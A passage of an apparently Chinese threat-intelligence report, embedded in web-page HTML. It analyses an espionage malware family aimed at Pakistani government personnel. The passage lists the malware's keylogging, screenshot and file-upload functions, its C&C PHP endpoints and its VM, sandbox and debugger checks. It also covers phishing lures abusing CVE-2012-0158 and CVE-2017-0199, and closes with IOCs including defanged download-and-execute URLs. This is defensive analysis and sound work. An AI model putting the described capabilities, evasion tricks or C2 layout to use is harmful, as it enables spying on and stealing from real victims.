>\n<tr>\n<td>EHDownloadClientMachineGeoLocation</td>\n<td></td>\n</tr>\n<tr>\n<td>EHDownloadDownloadFilesInDownloadFolderForModuleFile</td>\n<td>下载新模块</td>\n</tr>\n<tr>\n<td>EHExecuteDwonloadFilesInDownloadFolderForModuleFile</td>\n<td></td>\n</tr>\n<tr>\n<td>EHExecuteFile</td>\n<td>执行指定文件</td>\n</tr>\n<tr>\n<td>EHExecuteFile_Parameters_With_Wait_To_Close</td>\n<td></td>\n</tr>\n<tr>\n<td>EHExtractBinResource</td>\n<td></td>\n</tr>\n<tr>\n<td>EHExtractBufferFromFile</td>\n<td>读取指定文件的内容</td>\n</tr>\n<tr>\n<td>EHGetAeroModuleExeState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetDirectoryStructureFolderPath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetFileNameFromFilePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetFilePathFromFilePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetLastWriteTime</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetListerUploaderExeState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetListerUploaderStateFromServer</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetModuleFilePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetOnlineModuleFile</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetThisFinalRealeaseORNot</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetWinExePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHIsAeroFilesNeededServerState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHIsDots</td>\n<td></td>\n</tr>\n<tr>\n<td>EHIsInternetDataFilesNeededSeverState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHMyFileSeek</td>\n<td></td>\n</tr>\n<tr>\n<td>EHPathFileExists</td>\n<td></td>\n</tr>\n<tr>\n<td>EHPerformMainAllFunctionsOfApplication</td>\n<td></td>\n</tr>\n<tr>\n<td>EHPerformOnLineModuleFunctions</td>\n<td></td>\n</tr>\n<tr>\n<td>EHPutLogMessage</td>\n<td></td>\n</tr>\n<tr>\n<td>EHScreenShotGrabberCreateAndGetNewScrnShotFolderNeo</td>\n<td style="\'color:red\'">上传屏幕截图</td>\n</tr>\n<tr>\n<td>EHScreenShotGrabberGetConfigDataNeo</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetAeroFilesServerStateFalse</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetAeroModuleExeState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetInternetDataFilesServerStateFalse</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetListerUploaderExeState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetLogFilePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetValueForEHApplicationServer</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetValueForEHApplicationServerNeo</td>\n<td></td>\n</tr>\n<tr>\n<td>EHTerminateThisProcess</td>\n<td></td>\n</tr>\n<tr>\n<td>EHUploadFileKeyLogArchiveNeo</td>\n<td>上传键盘记录</td>\n</tr>\n<tr>\n<td>EHUploadFileMainUpload</td>\n<td>上传文件</td>\n</tr>\n<tr>\n<td>EHUploadFileRemoveableDrive</td>\n<td></td>\n</tr>\n<tr>\n<td>EHUploadFolderRecursive</td>\n<td></td>\n</tr>\n<tr>\n<td>EHUploadFolderRecursiveNeo</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n</center>\n<ol start="2">\n<li>通信控制：</li>\n</ol>\n<p class="line" data-line="223">受控端通过HTTP请求与控制服务器通信，通过访问不同的php页面与控制端交互：</p>\n<p class="text-center line" data-line="225"><img src="/uploads/2017/07/25/be35f96995c2353ac8b23f6798f7262d.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="227"><img src="/uploads/2017/07/25/11104c88181d21537583d5b3a4131c87.png" alt="" width="90%"></p>\n<p class="line" data-line="229">经过整理后的路径如下：</p>\n<ul>\n<li>/EHGetScrnShotConfig.php</li>\n<li>/getAllFiles.php</li>\n<li>/getExecutables.php</li>\n<li>/getExtensions_doc.php</li>\n<li>/getExtensions_nondoc.php</li>\n<li>/getExtensions_rmdrive.php</li>\n<li>/EHCreateUploadFolder.php</li>\n<li>/EHOnlineModuleOperations.php</li>\n<li>/EHListerFunction.php</li>\n<li>/EHAeroFunction.php</li>\n<li>/EHAeroFunctionFalse.php</li>\n<li>/EHDeleteListerFile.php</li>\n<li>/EHFolderWithName.php</li>\n<li>/EHDelFolderWithName.php</li>\n<li>/EHInternetDataFiles.php</li>\n<li>/EHInternetDataFilesFalse.php</li>\n<li>/EHCreateAndGetScrnShotFolder.php</li>\n<li>/EHMainUpload.php</li>\n<li>/EHMergeAndMoveMainUpload.php</li>\n<li>/EHRemoveableDriveUpload.php</li>\n<li>/EHMergeAndMoveRemoveableDrive.php</li>\n<li>/EHFileFolderUpload.php</li>\n<li>/EHMergeAndMoveFileFolder.php</li>\n<li>/EHUploadKeylogArchive.php</li>\n<li>/DO_NOT_NEED_A_URI</li>\n</ul>\n<ol start="3">\n<li>检查VM、沙箱和调试</li>\n</ol>\n<p class="line" data-line="260">通过特权指令检查Virtual PC和VMWare：</p>\n<p class="text-center line" data-line="262"><img src="/uploads/2017/07/25/e88dbcd4397243b4c906fd7cc81112fa.png" alt=""><img src="/uploads/2017/07/25/e781dc98e41e276d67641c5366295297.png" alt=""></p>\n<p class="line" data-line="264">通过dll来识别Sandboxie和是否调试：</p>\n<p class="text-center line" data-line="266"><img src="/uploads/2017/07/25/f23cdac98d216499b5359c50fba73440.png" alt="" width="90%"></p>\n<h2 class="line" data-line="268">扩展与关联分析</h2>\n<p class="line" data-line="270">使用<a href="http://ti.360.com">360威胁情报中心的威胁情报平台</a>对样本连接的C&amp;C地址（185.109.144.102）做进一步关联，我们发现了更多的信息。</p>\n<p class="text-center line" data-line="272"><img src="/uploads/2017/07/25/959432cad2c5d6d40d259d62dc7d703e.png" alt="" width="90%"></p>\n<p class="line" data-line="274">其中有几个样本引起了我们的注意：</p>\n<ol>\n<li>MD5：a6c7d68c6593b9dd2e9b42f08942a8b0，文件名：isi_report_of_2016.rar</li>\n</ol>\n<p class="line" data-line="278">这个样本是一个邮件附件，解压后为Name of Facilitators revealed.scr，这个其实是一个sfx自解压文件，点击后会将explorerss.pub改名为explorerss.exe，注册启动项并执行，然后打开Pakistan army officers cover blown.pdf迷惑受害人。</p>\n<p class="text-center line" data-line="280"><img src="/uploads/2017/07/25/983b177cf4eedac5772b63213ab843b5.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="282"><img src="/uploads/2017/07/25/c61fb927553f2aec1f0c137547934645.png" alt="" width="90%"></p>\n<p class="line" data-line="284">而explorerss.exe是由python打包成exe的，功能是窃取指定文件内容并上传到hxxps:// 185[.]109[.]144[.]102/browse.php?folder=%s&amp;%s中。将其中的python代码还原后，部分代码如下：</p>\n<p class="text-center line" data-line="286"><img src="/uploads/2017/07/25/fa19545206958eab8471323406fb797b.png" alt="" width="90%"></p>\n<ol start="2">\n<li>MD5：872e7043ee8490db6e455942642c2c86 文件名：Current vacancies.doc</li>\n</ol>\n<p class="line" data-line="290">这个样本利用CVE-2012-0158释放一个downloader，downloader会下载执行hxxp://185[.]109[.]144[.]102/DistBuild/DefenderReference.exe，之后的流程就和前面分析的一样，就不再多说了，值得注意的是文档的内容。显示为联合国招聘文件，这明显是对安全相关人员投递的邮件，有明显的政治动机：</p>\n<p class="text-center line" data-line="292"><img src="/uploads/2017/07/25/67d581ac06304a980c4b44ce451ef6ac.png" alt="cid:image001.png@01D2E5D2.5FAAFD20" width="90%"></p>\n<ol>\n<li>MD5: 1b41454bc0ff4ee428c0b49e614ef56c文件名：Ramadan Mubaraq.rtf</li>\n</ol>\n<p class="line" data-line="296">这个样本所利用的漏洞为CVE-2017-0199，olelink的地址为http://138[.]197[.]129[.]94/logo.doc</p>\n<p class="text-center line" data-line="298"><img src="/uploads/2017/07/25/44203dd80cb70f50f8040855f2d8bab2.png" alt="" width="90%"></p>\n<p class="line" data-line="300">从以上的分析和其他关联到的样本中，我们注意到一些有趣的事情：这些样本应该都是通过邮件附件的形式传递的，并且使用Office Nday漏洞或者社工手段引诱目标点开；从文件名、文档内容来看，都是对政治领域的相关人员进行的钓鱼邮件投递。综合多个样本的来源信息，这很有可能是一起针对巴基斯坦政府人员的定向攻击事件。</p>\n<h2 class="line" data-line="302">IOC</h2>\n<table>\n<thead>\n<tr>\n<th><strong>文件名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Current vacancies.doc</td>\n</tr>\n<tr>\n<td>peace-along-the-border-is-not-a-one-process-says-Lt-gen-ds-hooda.doc</td>\n</tr>\n<tr>\n<td>Name of Facilitators revealed.scr</td>\n</tr>\n<tr>\n<td>isi_report_of_2016.rar</td>\n</tr>\n<tr>\n<td>Pakistan army officers cover blown.pdf</td>\n</tr>\n<tr>\n<td>Ramadan Mubaraq.rtf</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>MD5</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>154ee0c3bb8250cae00d5ed0e6f894b4</td>\n</tr>\n<tr>\n<td>4f4cc89905bea999642a40d0590bdfa3</td>\n</tr>\n<tr>\n<td>6d7ef5c67604d62e63aa06c4a7832dac</td>\n</tr>\n<tr>\n<td>842e125beca97c185b33235e54e77d3a</td>\n</tr>\n<tr>\n<td>9cddfd8fa9dc98149e63f08f02a179cf</td>\n</tr>\n<tr>\n<td>c2be017b2fb3ad6f0f1c05ef10573b90</td>\n</tr>\n<tr>\n<td>c43bab60cbf7922a35979e4f41f9aa9e</td>\n</tr>\n<tr>\n<td>c5f76015b2cb15f59070d2e5cfdd8f6e</td>\n</tr>\n<tr>\n<td>cbd2340e37b2ae9fc85908affbb786a7</td>\n</tr>\n<tr>\n<td>d0dd1c70581606aa2a4926c5df4a32ee</td>\n</tr>\n<tr>\n<td>1b41454bc0ff4ee428c0b49e614ef56c</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>PDB</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\DefenderReference.pdb</td>\n</tr>\n<tr>\n<td>D:\\EH_DEVELOPMENT_SVN\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\EsstnalUpdte.pdb</td>\n</tr>\n<tr>\n<td>D:\\EH_DEVELOPMENT_SVN\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\ProcNeo.pdb</td>\n</tr>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\AdminNewDll.pdb</td>\n</tr>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\AdminServerDll.pdb</td>\n</tr>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\MSOBuild.pdb</td>\n</tr>\n<tr>\n<td>C:\\Users\\Fire\\Documents\\Visual Studio 2015\\Projects\\newfiles sent\\newfiles\\obj\\Release\\Pro-Gaurd.pdb</td>\n</tr>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\WelcomeScrn.pdb</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>C&amp;C</strong></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>185.109.144.102:80</td>\n<td>hxxp://185[.]109[.]144[.]102/DistBuild/DefenderReference.exe</td>\n</tr>\n<tr>\n<td></td>\n<td>hxxp://185[.]109[.]144[.]102/DO_NOT_NEED_A_URI</td>\n</tr>\n<tr>\n<td>185.109.144.102:443</td>\n<td>Tcp</td>\n</tr>\n<tr>\n<td>tes.sessions4life.pw</td>\n<td>hxxp://tes[.]sessions4life[.]pw/quiz/WelcomeScrn.exe</td>\n</tr>\n<tr>\n<td>138.197.129.94:80</td>\n<td>hxxp://138[.]197[.]129[.]94/logo.doc</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>Mutex</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>EHWinHTTPWebServiceCall_MUTEX</td>\n</tr>\n<tr>\n<td>EHGetListerUploaderExeStateNeo_MUTEX</td>\n</tr>\n</tbody>\n</table>\n'}},serverRendered:!0}</script><script defer src="/_nuxt/manifest.38f62477280dcc27df9e.js"></script><script defer src="/_nuxt/vendor.bundle.45eca4dc7fa9e1bc4361.js"></script><script defer src="/_nuxt/nuxt.bundle.8e9d53f64bed77ebfe81.js"></script>